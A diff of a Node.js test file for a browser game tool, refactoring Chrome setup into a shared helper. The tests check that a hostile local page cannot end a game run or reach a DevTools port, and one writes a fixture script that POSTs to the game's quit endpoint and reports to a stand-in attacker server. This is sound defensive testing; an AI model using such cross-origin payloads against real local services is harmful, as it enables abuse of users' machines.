@@ -8,10 +8,10 @@ import { after, test } from 'node:test'
 import { pathToFileURL } from 'node:url'
 import { exportGame } from '../src/export.ts'
 import { ROOT } from '../src/package.ts'
-import { NO_DEVTOOLS_PORT, buildPage, findChrome, openWindow, serve } from '../src/serve.ts'
+import { NO_DEVTOOLS_PORT, buildPage, openWindow, serve } from '../src/serve.ts'
 import { launchChrome, openPage } from '../src/shot.ts'
+import { CHROME as chrome, testChrome } from './chrome.ts'
 
-const chrome = findChrome()
 const TMP = join(ROOT, 'test', '.tmp')
 mkdirSync(TMP, { recursive: true })
 const made: string[] = []
@@ -136,7 +136,7 @@ test('another page on this machine, or a file, can neither end a run nor run scr
   game = server.url
   const file = join(dir, 'hostile.html')
   writeFileSync(file, `<script>const done = () => fetch('${attacker}report?file-posted', { mode: 'no-cors' }); fetch('${game}quit', { method: 'POST', mode: 'no-cors' }).then(done, done)</script>`)
-  const browser = await launchChrome(chrome ?? 'no Chrome', { protocolTimeout: 60_000 })
+  const { browser, close } = await testChrome()
   try {
     const tab = await browser.newPage()
     await openPage(tab, attacker)
@@ -163,7 +163,7 @@ test('another page on this machine, or a file, can neither end a run nor run scr
     await player.keyboard.press('Escape')
     await until('Esc to end the session', () => quits === 1)
   } finally {
-    await browser.close()
+    await close()
     server.close()
     hostile.close()
     await page.dispose()
@@ -324,7 +324,7 @@ test("shot's Chrome talks over a pipe, opens no DevTools port even when a wrappe
   const port = await freePort()
   process.env.THREEJAM_CANARY = 'secret'
   try {
-    const browser = await launchChrome(wrapper(dir, [`--remote-debugging-port=${port}`, `--user-data-dir=${join(dir, 'profile')}`]))
+    const { browser, close } = await testChrome(wrapper(dir, [`--remote-debugging-port=${port}`, `--user-data-dir=${join(dir, 'profile')}`]))
     try {
       await browser.newPage()
       const { env, args, profile } = given(dir)
@@ -343,7 +343,7 @@ test("shot's Chrome talks over a pipe, opens no DevTools port even when a wrappe
         { endpoint: '', pipe: true, port: NO_DEVTOOLS_PORT, activePort: false, wrapperProfile: false, unsafeSwiftShader: false, isolationOff: false, canary: false },
       )
     } finally {
-      await browser.close()
+      await close()
     }
   } finally {
     delete process.env.THREEJAM_CANARY
